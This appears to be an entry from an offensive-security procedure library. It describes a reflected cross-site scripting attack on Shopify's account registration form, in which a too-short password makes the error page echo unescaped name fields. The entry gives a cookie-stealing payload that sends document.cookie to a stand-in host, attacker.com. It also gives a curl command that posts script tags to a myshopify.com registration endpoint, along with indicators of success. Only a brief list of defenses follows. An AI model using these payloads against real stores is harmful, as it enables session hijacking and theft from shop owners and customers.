---
id: proc-uuid-2
tags:
  - xss
  - payload-injection
  - shopify
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-shopify-registration-post]]'
verified: false
platforms:
  - Web
  - Cloud (Shopify)
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:55:38.219Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Submit-Malicious-Registration-Payload

## Summary

This procedure injects malicious HTML/JavaScript into the Shopify registration form's name fields using a short password to trigger an error response that reflects the unsanitized input.

## Description

The Shopify /account/register endpoint accepts POST requests with user input in first_name and last_name parameters. By providing a password shorter than the required length (typically 5+ characters), the server returns an error page echoing the name values without HTML escaping. This allows injected <script> tags or other HTML to execute when rendered. The attack targets *.myshopify.com domains and works despite captcha in some cases.

## Requirements

1. Accessible /account/register endpoint
2. curl or equivalent HTTP client
3. Knowledge of form parameters (e.g., forms_key may vary)

## Defense

Defensive measures and detection strategies:

- Sanitize all reflected user input in error messages
- Implement output encoding (e.g., HTML entity encoding) for name fields
- Add CSRF tokens to the registration form
- Rate-limit form submissions to prevent abuse

## Objectives

1. Trigger server-side validation error
2. Reflect malicious payload in response
3. Achieve JavaScript execution on load

## Instructions

### Step 1: Prepare Payload

**Context**: Craft HTML/JS payload for name fields, e.g., for testing: <script>alert('XSS')</script>; for exploitation: <script>fetch('http://attacker.com/steal?data='+document.cookie)</script>.

### Step 2: Submit via curl

**Context**: Use POST to send form data with short password.

**Command** ([[commands/curl-shopify-registration-post]]):
```bash
curl -X POST 'https://example.myshopify.com/account/register' \
  -d 'forms_key=...' \
  -d 'contact[email]=test@example.com' \
  -d 'customer[first_name]=<script>alert("XSS")</script>' \
  -d 'customer[last_name]=<script>alert("XSS")</script>' \
  -d 'customer[password]=pass' \
  -d 'commit=Create account'
```

> This sends the payload; inspect the response for reflected content.

### Step 3: Inspect Response

**Context**: Check if names are echoed unescaped in the HTML error block.

View the response body for patterns like <p>First name: <injected payload></p>.

**Expected Output**: HTML response with executable script tags.

**Success Indicators**:
- Payload appears in response without &lt;script&gt; encoding
- Alert or network request on browser load

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/curl-shopify-registration-post]]

## Tools Used


## Tags

- [[xss]]
- [[payload-injection]]
- [[shopify]]
